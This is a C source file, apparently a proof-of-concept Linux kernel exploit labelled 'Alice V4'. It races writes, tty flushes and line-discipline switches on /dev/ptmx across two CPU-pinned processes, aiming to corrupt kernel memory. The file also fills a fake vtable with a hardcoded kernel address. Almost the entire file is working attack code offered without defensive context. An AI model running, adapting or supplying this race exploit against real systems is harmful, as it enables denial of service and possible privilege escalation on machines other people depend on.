#define _GNU_SOURCE
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

#define TRAIN_SIZE 1024
#define TARGET_KERN_PANIC 0xffffffff8128e9d0 

struct fake_vtable { uint64_t ops[32]; };

void pin_to_cpu(int cpu) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

void hammer_v4(int fd, void *bomb, void *vtable) {
    struct iovec iov = {bomb, 4096};
    int ldisc_tty = 0;
    int ldisc_slip = 2;
    int flush = 0x2;

    for (int i = 0; i < TRAIN_SIZE; i++) {
        // High-speed race: Write + Flush + LDisc Switch
        syscall(20, (long)fd, &iov, 1);
        ioctl(fd, 0x540b, flush);
        ioctl(fd, 0x5423, (i % 2) ? &ldisc_tty : &ldisc_slip);
        
        // Jitter: Micro-stalls to let the kworker catch up
        if (i % 10 == 0) {
            struct timespec ts = {0, 1000}; // 1 microsecond
            nanosleep(&ts, NULL);
        }
    }
}

int main() {
    printf("[*] Alice V4: CPU-Pinned LDisc Collision\n");

    // Setup Fake VTable and Memory Grave
    void *pages = mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    mprotect(pages + 4096, 4096, PROT_NONE); 
    struct fake_vtable *vt = (struct fake_vtable *)pages;
    for(int i=0; i<32; i++) vt->ops[i] = TARGET_KERN_PANIC;

    while (1) {
        int fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (fd < 0) continue;

        if (fork() == 0) {
            pin_to_cpu(1); // Child on Core 1
            hammer_v4(fd, (void*)vt, (void*)vt);
            close(fd);
            exit(0);
        }
        
        pin_to_cpu(0); // Parent on Core 0
        hammer_v4(fd, (void*)vt, (void*)vt);
        close(fd);
    }
    return 0;
}
